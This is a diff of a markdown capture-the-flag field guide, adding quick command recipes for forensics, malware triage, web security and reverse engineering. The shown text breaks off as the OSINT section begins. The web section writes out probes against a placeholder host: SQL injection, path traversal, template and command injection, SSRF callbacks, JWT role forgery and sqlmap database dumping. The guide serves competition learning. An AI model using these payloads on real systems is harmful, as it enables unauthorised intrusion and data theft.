@@ -8,18 +8,18 @@ Prepared for Windows/WSL and Kali from the supplied repository, tool workbook an
 - [Start here: the human solver's field guide](#00-start-here)
 - [Tools and competition rules](#00-tool-rules)
 - [First ten minutes: get evidence before guessing](#01-first-ten-minutes)
-- [Disk, memory, and host forensics](#03-forensics)
-- [Malware analysis and configuration recovery](#09-malware)
-- [Web exploitation: follow the request to the trust boundary](#02-web-exploitation)
-- [Reverse engineering: turn a program into a checkable explanation](#06-reverse-engineering)
-- [OSINT from supplied evidence](#10-osint)
-- [Cryptography: recover the structure before the secret](#07-cryptography)
-- [Miscellaneous: turn unfamiliar artifacts into a small model](#11-miscellaneous)
-- [Network captures and hardware signals](#04-network)
-- [Steganography, documents, and media](#05-steganography)
-- [Binary exploitation: prove the primitive, then build the chain](#08-binary-exploitation)
-- [Pwn practice atlas: 43 cases, each with a specific lesson](#13-pwn-practice-atlas)
-- [Advanced cryptography: choose a model you can verify](#14-advanced-crypto)
+- [Digital forensics](#03-forensics)
+- [Malware analysis](#09-malware)
+- [Web security](#02-web-exploitation)
+- [Reverse engineering](#06-reverse-engineering)
+- [OSINT](#10-osint)
+- [Cryptography](#07-cryptography)
+- [Miscellaneous](#11-miscellaneous)
+- [Network captures](#04-network)
+- [Steganography](#05-steganography)
+- [Binary exploitation](#08-binary-exploitation)
+- [Pwn practice atlas](#13-pwn-practice-atlas)
+- [Advanced cryptography](#14-advanced-crypto)
 - [Vernon's CPTS notes](#cpts)
 - [External Resources](#cpts-external-resources-8d4c7c1a)
 - [Things to run on base Kali](#cpts-things-to-run-on-base-kali-16524e15)
@@ -1214,6 +1214,201 @@ Adapted from `solve-challenge/SKILL.md`, `solve-challenge/difficulty-routing.md`
 
 <a id="03-forensics"></a>
 
+<a id="03-forensics--digital-forensics"></a>
+
+# Digital forensics
+
+[Tool placement and competition rules](#00-tool-rules). Enter paths when prompted; run `recipes/` commands from the extracted guide root.
+
+<a id="03-forensics--quick-preserve-the-original"></a>
+
+## Quick: preserve the original
+
+**Windows · PowerShell**
+
+```powershell
+$file = Read-Host 'Evidence file path'
+$copy = Read-Host 'New working-copy path'
+Copy-Item -LiteralPath $file -Destination $copy
+Get-FileHash -Algorithm SHA256 -LiteralPath $file,$copy
+Get-Item -LiteralPath $file | Select-Object Name,Length,LastWriteTimeUtc
+```
+
+**Look for:** matching SHA256 hashes.
+**If not:** recopy before extracting; download timestamps are not incident timestamps.
+
+<a id="03-forensics--quick-find-the-filesystem"></a>
+
+## Quick: find the filesystem
+
+**WSL · Sleuth Kit**
+
+```bash
+read -r -p 'Raw disk image path: ' FILE
+mmls "$FILE"
+read -r -p 'Filesystem start sector from mmls (partition-only: 0): ' START
+read -r -p 'Sector size in bytes from image information: ' SECTOR
+fsstat -b "$SECTOR" -o "$START" "$FILE"
+fls -b "$SECTOR" -o "$START" -r -p "$FILE" > files.txt
+fls -b "$SECTOR" -o "$START" -r -d -p "$FILE" > deleted.txt
+```
+
+**Look for:** filenames and metadata addresses in `files.txt` and `deleted.txt`.
+**If not:** check sector units and container format before assuming corruption.
+
+<a id="03-forensics--quick-recover-one-listed-file"></a>
+
+## Quick: recover one listed file
+
+**WSL · Sleuth Kit**
+
+```bash
+read -r -p 'Raw disk image path: ' FILE
+read -r -p 'Filesystem start sector: ' START
+read -r -p 'Sector size in bytes: ' SECTOR
+read -r -p 'Metadata address from fls, without trailing colon: ' ADDR
+read -r -p 'New recovered-file path: ' OUT
+istat -b "$SECTOR" -o "$START" "$FILE" "$ADDR"
+icat -b "$SECTOR" -o "$START" "$FILE" "$ADDR" > "$OUT"
+xxd -l 64 "$OUT"
+```
+
+**Look for:** expected signature, size and content.
+**If not:** deleted fragmented data may need carving.
+
+<a id="03-forensics--quick-browse-or-carve-a-disk"></a>
+
+## Quick: browse or carve a disk
+
+**Windows · Autopsy:** New Case → enter case name/location → Add Data Source → Disk Image or VM File → select image → choose relevant ingest modules → Finish. Browse File Views and Deleted Files; right-click a file → Extract File(s).
+
+**Kali · PhotoRec**
+
+```bash
+read -r -p 'Disk image path: ' FILE
+read -r -p 'New carving output directory: ' OUT
+photorec /log /d "$OUT" "$FILE"
+```
+
+**Look for:** valid recovered files; retain the extraction source.
+**If not:** carving cannot reliably restore fragmented files or original paths.
+
+<a id="03-forensics--quick-identify-a-virtual-disk-container"></a>
+
+## Quick: identify a virtual disk container
+
+**Kali · qemu-img** — keep split extents and backing snapshots together.
+
+```bash
+read -r -p 'VMDK descriptor path: ' FILE
+qemu-img info --backing-chain "$FILE"
+read -r -p 'New raw image output path: ' OUT
+qemu-img convert -f vmdk -O raw "$FILE" "$OUT"
+```
+
+**Kali · EWF tools**, for E01 instead:
+
+```bash
+read -r -p 'First E01 segment path: ' FILE
+ewfinfo "$FILE"
+```
+
+**Look for:** complete backing chain, format and sector information.
+**If not:** locate missing extents before conversion.
+
+<a id="03-forensics--quick-inspect-archives-and-preserve-duplicate-members"></a>
+
+## Quick: inspect archives and preserve duplicate members
+
+**Kali · 7-Zip**
+
+```bash
+read -r -p 'Archive path: ' FILE
+7z l "$FILE"
+7z t "$FILE"
+read -r -p 'New extraction directory: ' OUT
+7z x "$FILE" "-o$OUT"
+```
+
+**WSL · Python**, for tar archives with repeated names:
+
+```bash
+read -r -p 'Tar archive path: ' FILE
+read -r -p 'New output directory: ' OUT
+python3 recipes/tar_keep.py "$FILE" --out "$OUT"
+```
+
+**Look for:** valid checksums; duplicate versions indexed in `manifest.jsonl`.
+**If not:** inspect encryption or header damage in the full reference.
+
+<a id="03-forensics--quick-inspect-supplied-memory"></a>
+
+## Quick: inspect supplied memory
+
+**WSL · Volatility 3**, with installed matching symbols:
+
+```bash
+read -r -p 'Memory dump path: ' FILE
+vol --offline -f "$FILE" windows.info
+vol --offline -f "$FILE" windows.pstree
+vol --offline -f "$FILE" windows.cmdline
+vol --offline -f "$FILE" windows.netscan
+vol --offline -f "$FILE" windows.filescan > filescan.txt
+```
+
+**Look for:** suspicious parentage, arguments, endpoints and file objects.
+**If not:** symbol failures are environment limitations; check `vol --help`, then inspect raw strings.
+
+<a id="03-forensics--quick-build-a-windows-event-timeline"></a>
+
+## Quick: build a Windows event timeline
+
+**Windows · PowerShell**
+
+```powershell
+$file = Read-Host 'Exported EVTX path'
+Get-WinEvent -Path $file -Oldest |
+  Where-Object { $_.Id -in 1102,4624,4688,4720,4726,4781 } |
+  Select-Object TimeCreated,Id,ProviderName,Message |
+  Export-Csv -NoTypeInformation -Encoding UTF8 .\events.csv
+```
+
+For missing message resources, preserve named XML fields:
+
+```powershell
+$file = Read-Host 'Exported EVTX path'
+Get-WinEvent -Path $file -Oldest |
+  ForEach-Object { $_.ToXml() } |
+  Set-Content -Encoding UTF8 .\events-xml.txt
+```
+
+**Look for:** 4688 `NewProcessName`/`CommandLine`; XML `SystemTime` is UTC.
+**If not:** check the provider; blank arguments may mean auditing was disabled.
+
+<a id="03-forensics--quick-inspect-browser-or-app-databases"></a>
+
+## Quick: inspect browser or app databases
+
+**Kali · SQLite**
+
+```bash
+read -r -p 'SQLite database path: ' FILE
+sqlite3 -readonly "$FILE" '.tables'
+sqlite3 -readonly "$FILE" '.schema'
+read -r -p 'Read-only SELECT query using the displayed schema: ' QUERY
+sqlite3 -readonly -header -column "$FILE" "$QUERY"
+```
+
+**Look for:** URLs, downloads, timestamps and identifiers.
+**If not:** retain matching WAL/SHM files; normal queries do not recover deleted rows.
+
+<a id="03-forensics--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
+
 <a id="03-forensics--disk-memory-and-host-forensics"></a>
 
 # Disk, memory, and host forensics
@@ -1687,10 +1882,203 @@ Record the input hash, partition/stream offset, inode or process ID, exact comma
 
 Source material adapted: `ctf-forensics/SKILL.md`, `disk-and-memory.md`, `disk-advanced.md`, `disk-recovery.md`, `linux-forensics.md`, and `windows.md` within `ctf-forensics/`. Network, media, and malware overlaps continue in the neighboring chapters. Historical installers, cloud CLI enumeration, unsupported snapshot mounters, and collision-generator recipes were removed from the competition workflow.
 
+</details>
+
 
 ---
 
 <a id="09-malware"></a>
+
+<a id="09-malware--malware-analysis"></a>
+
+# Malware analysis
+
+[Tool placement and competition rules](#00-tool-rules). Keep samples local; these steps inspect without executing them. Run `recipes/` commands from the extracted guide root.
+
+<a id="09-malware--quick-hash-and-identify-the-sample"></a>
+
+## Quick: hash and identify the sample
+
+**Windows · PowerShell**
+
+```powershell
+$file = Read-Host 'Sample path'
+Get-FileHash -Algorithm SHA256 -LiteralPath $file
+```
+
+**WSL · xxd, strings, objdump**
+
+```bash
+read -r -p 'Sample path: ' FILE
+xxd -l 128 "$FILE"
+strings -a -n 6 "$FILE" > strings-ascii.txt
+strings -a -e l -n 6 "$FILE" > strings-utf16.txt
+objdump -f "$FILE"
+objdump -x "$FILE" > headers.txt
+```
+
+**Look for:** architecture, imports, URLs, paths and config markers.
+**If not:** investigate encoding/packing; high entropy alone does not identify either.
+
+<a id="09-malware--quick-identify-capabilities-and-decoded-strings"></a>
+
+## Quick: identify capabilities and decoded strings
+
+**Kali · file, capa, FLOSS**
+
+```bash
+read -r -p 'Sample path: ' FILE
+file "$FILE"
+capa "$FILE" > capabilities.txt
+floss "$FILE" > decoded-strings.txt
+```
+
+**Look for:** decryptors, persistence APIs and useful configuration strings.
+**If not:** follow imports/callers in a decompiler; capability matches do not prove execution.
+
+<a id="09-malware--quick-follow-native-code-to-its-configuration"></a>
+
+## Quick: follow native code to its configuration
+
+**WSL · Ghidra:** File → New Project → Non-Shared Project → name/location → File → Import File → sample → double-click program → Analyze → Search → for Strings. Select a clue → references → caller → Decompiler.
+
+**WSL · objdump**, for an observed PE `.rdata` section:
+
+```bash
+read -r -p 'PE sample path: ' FILE
+objdump -h "$FILE"
+objdump -s -j .rdata "$FILE" > rdata.txt
+```
+
+**Look for:** blob, key, IV, byte order and exact decryptor arithmetic.
+**If not:** trace resource-loading APIs; verify decompiler types against assembly.
+
+<a id="09-malware--quick-decode-powershell-encodedcommand"></a>
+
+## Quick: decode PowerShell EncodedCommand
+
+**Windows · PowerShell** — save only the copied Base64 argument in a text file.
+
+```powershell
+$file = Read-Host 'Text file containing only the EncodedCommand value'
+$encoded = (Get-Content -Raw -LiteralPath $file).Trim()
+$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
+Set-Content -LiteralPath .\decoded.ps1.txt -Value $decoded -Encoding UTF8
+Get-Content -LiteralPath .\decoded.ps1.txt
+```
+
+**Look for:** readable UTF-16LE script text and another decoding layer.
+**If not:** check literal boundaries/encoding; never dot-source the result.
+
+<a id="09-malware--quick-decode-layers-or-format-javascript"></a>
+
+## Quick: decode layers or format JavaScript
+
+**WSL · Python**, for an extracted Base64 literal and optional gzip/zlib layer:
+
+```bash
+read -r -p 'Text file containing only the Base64 value: ' FILE
+read -r -p 'New decoded-output directory: ' OUT
+python3 recipes/layers.py "$FILE" --out "$OUT"
+```
+
+**Kali · js-beautify**
+
+```bash
+read -r -p 'JavaScript path: ' FILE
+js-beautify "$FILE" -o readable.js
+```
+
+**Look for:** string tables, pure transformations and payload boundaries.
+**If not:** reproduce literal transformations separately; replacing `eval` does not neutralize earlier code.
+
+<a id="09-malware--quick-inspect-macros-and-package-contents"></a>
+
+## Quick: inspect macros and package contents
+
+**Kali · oletools**
+
+```bash
+read -r -p 'Office document path: ' FILE
+oleid "$FILE"
+olevba "$FILE" > macro-report.txt
+```
+
+**Kali · 7-Zip**, for package/container files:
+
+```bash
+read -r -p 'Package archive path: ' FILE
+7z l "$FILE"
+read -r -p 'New extraction directory: ' OUT
+7z x "$FILE" "-o$OUT"
+```
+
+**Look for:** auto-open macros, installation hooks, `postinst` and embedded scripts.
+**If not:** inspect nested archives and compare supplied known-good source; do not install the package.
+
+<a id="09-malware--quick-inspect-managed-and-bundled-code"></a>
+
+## Quick: inspect managed and bundled code
+
+**Windows · dnSpyEx:** File → Open → assembly → expand types → entry point/static constructors; Edit → Search → `FromBase64String`, `TcpClient`, registry calls → follow references.
+
+**Kali · jadx**, for Android:
+
+```bash
+read -r -p 'APK path: ' FILE
+read -r -p 'New decompilation directory: ' OUT
+jadx -d "$OUT" "$FILE"
+```
+
+**Kali · pyinstxtractor-ng**, for PyInstaller:
+
+```bash
+read -r -p 'PyInstaller bundle path: ' FILE
+pyinstxtractor-ng "$FILE"
+```
+
+**Look for:** config fields, startup triggers and recovered bytecode/resources.
+**If not:** check bytecode-version support; use native analysis for JNI or native components.
+
+<a id="09-malware--quick-correlate-supplied-memory-evidence"></a>
+
+## Quick: correlate supplied memory evidence
+
+**WSL · Volatility 3**, using installed matching symbols:
+
+```bash
+read -r -p 'Memory dump path: ' FILE
+vol --offline -f "$FILE" windows.pstree
+vol --offline -f "$FILE" windows.psscan
+vol --offline -f "$FILE" windows.cmdline
+vol --offline -f "$FILE" windows.netscan
+vol --offline -f "$FILE" windows.malfind
+```
+
+**Look for:** matching process ancestry, command lines, endpoints and suspicious regions.
+**If not:** check plugin/symbol support; executable private memory also occurs in legitimate JIT runtimes.
+
+<a id="09-malware--quick-locate-known-indicators-locally"></a>
+
+## Quick: locate known indicators locally
+
+**Kali · YARA**, using a supplied or previously prepared rule file:
+
+```bash
+read -r -p 'YARA rule file path: ' RULES
+read -r -p 'Sample or memory dump path: ' FILE
+yara -s "$RULES" "$FILE"
+```
+
+**Look for:** matching string offsets to inspect in the sample/dump.
+**If not:** trace data flow; family names and broad signatures are only leads. Reconstruct captured C2 offline via the network chapter.
+
+<a id="09-malware--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="09-malware--malware-analysis-and-configuration-recovery"></a>
 
@@ -1969,10 +2357,262 @@ Check name casing, terminating NUL, DLL-name inclusion, and seed. Hash collision
 
 Source material adapted: all five files in `ctf-malware/`. The useful manual decompiler/debugger reasoning from `tools-mcp.md` was retained; agent calls and unsupported debuggers were removed. Live bot access, ARP interception/RST injection, unapproved parser packages, and public sandbox uploads were excluded.
 
+</details>
+
 
 ---
 
 <a id="02-web-exploitation"></a>
+
+<a id="02-web-exploitation--web-security"></a>
+
+# Web security
+
+**Kali Bash** unless marked WSL. Replace example URLs, routes and account values. Run `recipes/` commands from the extracted guide folder. [Tool locations](#tool-chooser--web) · [Event rules](#competition--what-is-allowed).
+
+<a id="02-web-exploitation--quick-inspect-a-page-and-its-headers"></a>
+
+## Quick: inspect a page and its headers
+
+```bash
+URL='http://challenge.example'  # replace; no trailing slash
+curl -sS --max-time 10 -D headers.txt -o page.html "$URL/"
+cat headers.txt
+rg -n 'href=|src=|action=|fetch\(|/api/|<!--' page.html
+```
+
+**Look for:** redirects, cookies, API paths, comments. **If empty:** Chrome → F12 → Network → reload → inspect the request's Response.
+
+<a id="02-web-exploitation--quick-find-hidden-paths-with-ffuf"></a>
+
+## Quick: find hidden paths with ffuf
+
+```bash
+URL='http://challenge.example'
+curl -sS -D missing.headers -o missing.body "$URL/definitely-missing-7391"
+printf '%s\n' robots.txt sitemap.xml admin api backup export > words.txt
+ffuf -u "$URL/FUZZ" -w words.txt -mc all -ac \
+  -t 1 -rate 1 -timeout 10 -maxtime 30 -of json -o paths.json
+```
+
+**Look for:** a different body/template, length, redirect or authentication requirement—not just HTTP 200. **If nothing:** inspect `missing.body`; retry without `-ac` and add paths found in source.
+
+<a id="02-web-exploitation--quick-check-a-candidate-manually"></a>
+
+## Quick: check a candidate manually
+
+```bash
+URL='http://challenge.example'
+ROUTE='/admin'  # replace with one discovered path
+curl -sS -D candidate.headers -o candidate.body "$URL$ROUTE"
+cat candidate.headers
+cat candidate.body
+```
+
+**Look for:** actual content rather than the custom error page. **If redirected:** inspect `Location`; add `-L` only when following it is intended.
+
+<a id="02-web-exploitation--quick-try-gobuster-instead"></a>
+
+## Quick: try Gobuster instead
+
+```bash
+URL='http://challenge.example'
+printf '%s\n' admin api backup export > words.txt
+gobuster dir -u "$URL/" -w words.txt -t 1 --delay 1s
+```
+
+**Look for:** reported routes. **If wildcard responses stop it:** use the ffuf baseline workflow above. Do not guess an excluded response length.
+
+<a id="02-web-exploitation--quick-replay-a-logged-in-request"></a>
+
+## Quick: replay a logged-in request
+
+Chrome → F12 → Network → select request → Headers → copy the `Cookie` value.
+
+```bash
+URL='http://challenge.example'
+COOKIE='session=PASTE_YOUR_COOKIE'
+curl -i --max-time 10 -b "$COOKIE" "$URL/api/me"
+```
+
+**Look for:** your account data. **If logged out:** refresh the cookie and copy the real route; preserve CSRF headers if required.
+
+<a id="02-web-exploitation--quick-send-form-data-or-json"></a>
+
+## Quick: send form data or JSON
+
+**Form login:** replace both credentials and field names.
+
+```bash
+URL='http://challenge.example'
+curl -i -c cookies.txt "$URL/login" \
+  --data-urlencode 'username=YOUR_USERNAME' \
+  --data-urlencode 'password=YOUR_PASSWORD'
+curl -i -b cookies.txt "$URL/profile"
+```
+
+**JSON API:** copy the application's real fields.
+
+```bash
+URL='http://challenge.example'
+COOKIE='session=PASTE_YOUR_COOKIE'
+curl -i -b "$COOKIE" "$URL/api/profile" \
+  -H 'Content-Type: application/json' --data '{"display_name":"test"}'
+```
+
+**Look for:** a response and persisted change. **If rejected:** copy method, content type and CSRF token from the working request.
+
+<a id="02-web-exploitation--quick-compare-access-to-two-objects"></a>
+
+## Quick: compare access to two objects
+
+Use two supplied test accounts/objects. Keep the same cookie; change only the ID.
+
+```bash
+URL='http://challenge.example'
+COOKIE='session=PASTE_ACCOUNT_A_COOKIE'
+OWN_ID='101'
+OTHER_ID='102'  # replace with account B's known object
+curl -sS -b "$COOKIE" "$URL/api/documents/$OWN_ID" -o own.json
+curl -sS -b "$COOKIE" "$URL/api/documents/$OTHER_ID" -o other.json
+diff -u own.json other.json
+```
+
+**Look for:** account A receiving B's private object. **If identical:** verify the IDs and response bodies; shared error text proves nothing.
+
+<a id="02-web-exploitation--quick-test-one-sql-parameter"></a>
+
+## Quick: test one SQL parameter
+
+```bash
+URL='http://challenge.example'
+curl -sS -G "$URL/item" --data-urlencode 'id=1 AND 1=1' -o true.html
+curl -sS -G "$URL/item" --data-urlencode 'id=1 AND 1=2' -o false.html
+diff -u true.html false.html
+```
+
+**Look for:** repeatable true/false behavior. **If unchanged:** the field may be quoted, ignored or protected; use its normal request before changing syntax.
+
+<a id="02-web-exploitation--quick-use-sqlmap-on-the-confirmed-request"></a>
+
+## Quick: use sqlmap on the confirmed request
+
+Burp Repeater → right-click request → Copy to file → save as `request.txt`. Keep its method, body and cookies.
+
+```bash
+sqlmap -r request.txt -p id --batch --level=1 --risk=1 \
+  --threads=1 --timeout=10 --retries=0 --dbs
+```
+
+Choose only the relevant database/table/column from output:
+
+```bash
+DB='CHALLENGE_DATABASE'
+TABLE='CHALLENGE_TABLE'
+COLUMN='FLAG_COLUMN'
+sqlmap -r request.txt -p id --batch -D "$DB" --tables
+sqlmap -r request.txt -p id --batch -D "$DB" -T "$TABLE" --columns
+sqlmap -r request.txt -p id --batch -D "$DB" -T "$TABLE" -C "$COLUMN" --dump
+```
+
+**If unauthorized:** refresh the saved cookie/token. **If no injection:** revisit the manual test; do not treat a timeout as proof.
+
+<a id="02-web-exploitation--quick-inspect-or-edit-a-jwt"></a>
+
+## Quick: inspect or edit a JWT
+
+**WSL Python.** Save only the token to `token.txt`.
+
+```bash
+python3 - <<'PY'
+import base64, json
+from pathlib import Path
+parts = Path('token.txt').read_text().strip().split('.')
+for label, part in zip(('header', 'claims'), parts[:2]):
+    print(label, json.loads(base64.urlsafe_b64decode(part + '=' * (-len(part) % 4))))
+PY
+```
+
+Test altered claims when missing signature verification is the hypothesis:
+
+```bash
+python3 recipes/jwt_claim.py token.txt --claim role --value '"admin"'
+```
+
+**Look for:** server acceptance after replacing the token in the original request. Decoding or changing claims alone proves nothing.
+
+<a id="02-web-exploitation--quick-test-a-filename-parameter"></a>
+
+## Quick: test a filename parameter
+
+```bash
+URL='http://challenge.example'
+curl -i -G "$URL/download" --data-urlencode 'file=../../../../etc/hostname'
+```
+
+**Look for:** file content, not the reflected filename. **If blocked:** confirm the real parameter/path from the working download; [path variants](#02-web-exploitation--8-file-reads-paths-and-uploads) are in Full reference.
+
+<a id="02-web-exploitation--quick-test-a-template-or-command-field"></a>
+
+## Quick: test a template or command field
+
+**Template arithmetic:** replace the route and input name.
+
+```bash
+URL='http://challenge.example'
+curl -i -G "$URL/render" --data-urlencode 'name={{7*7}}'
+```
+
+**Command boundary:** use only on a field expected to reach a command.
+
+```bash
+URL='http://challenge.example'
+curl -i "$URL/ping" --data-urlencode 'host=127.0.0.1;printf CTF_MARKER'
+```
+
+**Look for:** evaluated `49` or executed `CTF_MARKER`, not a literal echo. **If present:** identify the engine/process before selecting a payload from Full reference.
+
+<a id="02-web-exploitation--quick-test-server-side-url-fetching"></a>
+
+## Quick: test server-side URL fetching
+
+```bash
+URL='http://challenge.example'
+FETCH_URL='http://ORGANIZER_CALLBACK_HOST/test'
+curl -i "$URL/preview" --data-urlencode "url=$FETCH_URL"
+```
+
+**Look for:** a request at the organizer's callback endpoint. **If absent:** check the field/method and distinguish server fetches from your browser's requests.
+
+<a id="02-web-exploitation--quick-upload-a-harmless-marker"></a>
+
+## Quick: upload a harmless marker
+
+```bash
+URL='http://challenge.example'
+COOKIE='session=PASTE_YOUR_COOKIE'
+printf '%s\n' CTF_UPLOAD_MARKER > marker.txt
+curl -i -b "$COOKIE" "$URL/upload" -F 'file=@marker.txt;type=text/plain'
+```
+
+**Look for:** the returned retrieval URL and actual served bytes. **If rejected:** match the form field, file restrictions and CSRF token from a normal upload.
+
+<a id="02-web-exploitation--quick-use-burp-repeater-or-browser-devtools"></a>
+
+## Quick: use Burp Repeater or browser DevTools
+
+**Burp Community · WSL GUI:** Proxy → Open browser → perform the action → HTTP history → select request → Ctrl+R → Repeater → Send. Duplicate the tab, change one value, Send again. Compare status, headers and body. Keep nonce/token changes separate.
+
+**Chrome · Windows:** F12 → Network → Preserve log → repeat action → select request → Headers / Payload / Response. For an XSS hypothesis, first find your marker's HTML/attribute/script context; [browser-specific steps](#02-web-exploitation--12-browser-side-execution-and-origin-boundaries) are below.
+
+**If the page changes but the request does not:** inspect the browser console and client-side JavaScript.
+
+<a id="02-web-exploitation--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="02-web-exploitation--web-exploitation-follow-the-request-to-the-trust-boundary"></a>
 
@@ -2620,10 +3260,174 @@ Save a short sequence: normal baseline, minimal changed request, response eviden
 
 The source material merged here includes every file under `ctf-web/`: reconnaissance and field notes; authentication, JWT, OAuth and infrastructure; SQL and other injections; paths, uploads, templates, command execution, deserialization, SSRF and XML; browser, cache, race, protocol and Web3 patterns. The MCP guide and asynchronous fuzzer are explicitly replaced with the manual, bounded workflows above. Detailed file dispositions are in `human-guide/review/web-coverage.json`.
 
+</details>
+
 
 ---
 
 <a id="06-reverse-engineering"></a>
+
+<a id="06-reverse-engineering--reverse-engineering"></a>
+
+# Reverse engineering
+
+Run recipes from the extracted guide root (the folder containing `recipes`). Use supplied artifacts; [event rules](#competition). Tools: [chooser](#tool-chooser--reverse-engineering).
+
+<a id="06-reverse-engineering--quick-enter-the-correct-environment"></a>
+
+## Quick: enter the correct environment
+
+**Windows native · PowerShell**
+
+```powershell
+wsl --list --verbose
+wsl
+```
+
+**Windows WSL · Bash**
+
+```bash
+command -v python3 gdb objdump strings xxd
+python3 --version
+```
+
+**Look for:** installed paths; Ghidra also belongs to WSL.
+**If not:** use Kali radare2; native Windows uses x64dbg/dnSpyEx.
+
+<a id="06-reverse-engineering--quick-identify-the-file-and-search-strings"></a>
+
+## Quick: identify the file and search strings
+
+**Windows WSL · Bash**
+
+```bash
+read -r -p 'Local binary path: ' FILE
+objdump -f "$FILE"
+objdump -x "$FILE" > headers.txt
+strings -a -t x "$FILE" > strings.txt
+xxd -l 32 "$FILE"
+```
+
+**Look for:** architecture, imports, success/failure strings; open `strings.txt` in your editor.
+**If not:** try wide strings with `strings -a -e l "$FILE"`; packed strings may appear only at runtime.
+
+<a id="06-reverse-engineering--quick-follow-callers-in-radare2"></a>
+
+## Quick: follow callers in radare2
+
+**Kali · Bash**, then **radare2 prompt** ([command reference](https://book.rada.re/refcard/intro.html)).
+
+```bash
+read -r -p 'Local binary path: ' FILE
+r2 "$FILE"
+```
+
+```text
+aaa
+ii
+izz
+afl
+pdf @ main
+```
+
+**Look for:** comparison imports and the branch reaching success.
+**If not:** run `ie`; inspect entry-point calls when `main` is stripped. Use `axt @` followed by an exact import flag from `ii`.
+
+<a id="06-reverse-engineering--quick-read-the-checker-in-a-decompiler"></a>
+
+## Quick: read the checker in a decompiler
+
+**Windows WSL · Ghidra GUI:** File → New Project → Non-Shared Project → File → Import File → select binary → open → Analyze → Search → For Strings → select success text → Show References to → open caller in Decompiler.
+
+**Look for:** input length, byte width, operation order, key array and comparison array; follow each array address into Listing.
+**If not:** inspect Listing instructions; inferred types can hide truncation and signedness.
+
+<a id="06-reverse-engineering--quick-turn-observed-constants-into-helper-input"></a>
+
+## Quick: turn observed constants into helper input
+
+**Windows WSL · illustrative example**, not a solved unknown binary:
+
+```c
+uint8_t key[2] = {0x31, 0x72};       // key_hex: 3172
+uint8_t expected[4] = {194,124,224,120};
+for (i = 0; i < 4; i++) {
+    uint8_t x = input[i] ^ key[i % 2];
+    out[i] = (uint8_t)((x << 1) | (x >> 7)); // ROL8: rotation 1
+}
+ok = memcmp(out, expected, 4) == 0;
+```
+
+```bash
+cat > checker-example.json <<'JSON'
+{"key_hex":"3172","rotation":1,"expected":[194,124,224,120]}
+JSON
+python3 recipes/transform.py checker-example.json --out example-plain.bin
+xxd example-plain.bin
+```
+
+**Look for:** `PLAN` and a passing forward check. Copy your binary's actual bytes into equivalent JSON.
+**If not:** this helper handles only repeated-key XOR followed by byte rotation; addition, permutations or state need another model.
+
+<a id="06-reverse-engineering--quick-inspect-comparison-buffers-live"></a>
+
+## Quick: inspect comparison buffers live
+
+**Windows WSL · compatible Linux x86-64 ELF; Bash**, then **GDB**.
+
+```bash
+read -r -p 'Local ELF path: ' FILE
+gdb -nx -q "$FILE" -ex 'break memcmp' -ex run
+```
+
+```text
+bt
+info registers rdi rsi rdx
+x/16bx $rdi
+x/16bx $rsi
+```
+
+**Look for:** relevant caller, two buffers and comparison length in RDX; inspect only readable bytes ([GDB memory](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Memory.html)).
+**If not:** inline/custom comparisons need a breakpoint at their instruction; Windows x64 uses RCX/RDX/R8.
+
+<a id="06-reverse-engineering--quick-find-missing-files-or-runtime-checks"></a>
+
+## Quick: find missing files or runtime checks
+
+**Kali · Bash; executes the selected local binary.**
+
+```bash
+read -r -p 'Executable path (include ./ or use absolute): ' FILE
+ltrace -s 128 -o library.log "$FILE"
+strace -f -s 128 -o syscalls.log "$FILE"
+rg -n 'memcmp|strcmp|open|read|ptrace|mprotect' library.log syscalls.log
+```
+
+**Look for:** actual comparison values, required companion files and failed opens.
+**If not:** static linking/inlining can hide library calls; follow the check in the debugger.
+
+<a id="06-reverse-engineering--quick-switch-to-the-format-specific-reader"></a>
+
+## Quick: switch to the format-specific reader
+
+**Windows native · dnSpyEx:** File → Open → select .NET assembly → expand assembly/types → inspect entry point → follow comparison method.
+
+**Kali · Android GUI**
+
+```bash
+read -r -p 'Local APK path: ' FILE
+jadx-gui "$FILE"
+```
+
+**Look for:** input handler and success-string usages; verify the recovered candidate against the original checker.
+**If not:** native `.so` checks need Ghidra/radare2; transformed bytes alone are not the answer.
+
+<a id="06-reverse-engineering--full-reference"></a>
+
+## Full reference
+
+<details class="deep-reference" markdown="1">
+<summary>Explanations, advanced cases and sources</summary>
 
 <a id="06-reverse-engineering--reverse-engineering-turn-a-program-into-a-checkable-explanation"></a>
 
@@ -3210,10 +4014,160 @@ Keep the original hash, exact tool/environment, relevant function addresses, tra
 
 Source map: `ctf-reverse/SKILL.md`, `tools.md`, `radare2-r2pipe.md`, `tools-dynamic.md`, `tools-emulation.md`, `tools-advanced.md`, `tools-advanced-2.md`, `mba-simplification.md`, `anti-analysis.md`, `anti-analysis-ctf.md`, `patterns.md`, `patterns-runtime.md`, `patterns-ctf.md`, `patterns-ctf-2.md`, `patterns-ctf-3.md`, `languages.md`, `languages-platforms.md`, `languages-compiled.md`, `platforms.md`, `platforms-hardware.md`, `unicorn-emulation.md`, and `field-notes.md`. Paths after the first share the `ctf-reverse/` prefix. The source `ctf-reverse/tools-mcp.md` is retained as provenance only; its agent integration and unapproved-tool setup are excluded from the human workflow.
 
+</details>
+
 
 ---
 
 <a id="10-osint"></a>
+
+<a id="10-osint--osint"></a>
+
+# OSINT
+
+Set `FILE`/`DIR` to supplied evidence. Run Bash in the stated environment. [Full reference](#10-osint--full-reference) · [Tool chooser](#tool-chooser--osint). Record URLs, timestamps and independent confirmation.
+
+<a id="10-osint--quick-extract-metadata-and-coordinates"></a>
+
+## Quick: extract metadata and coordinates
+
+**WSL · ExifTool.** Input: original supplied media.
+
+```bash
+FILE='clue.jpg'
+exiftool -a -G1 -s "$FILE"
+exiftool -n -GPSLatitude -GPSLongitude -GPSLatitudeRef -GPSLongitudeRef -DateTimeOriginal -OffsetTimeOriginal "$FILE"
+```
+
+**Look for:** GPS, camera model, software, timezone and comments.
+**If not:** use visible signs/buildings; stripped metadata is common and metadata can be edited.
+
+<a id="10-osint--quick-search-a-supplied-pdf"></a>
+
+## Quick: search a supplied PDF
+
+**WSL · pdftotext / Python 3.** Input: PDF; writes a text copy.
+
+```bash
+FILE='clue.pdf'
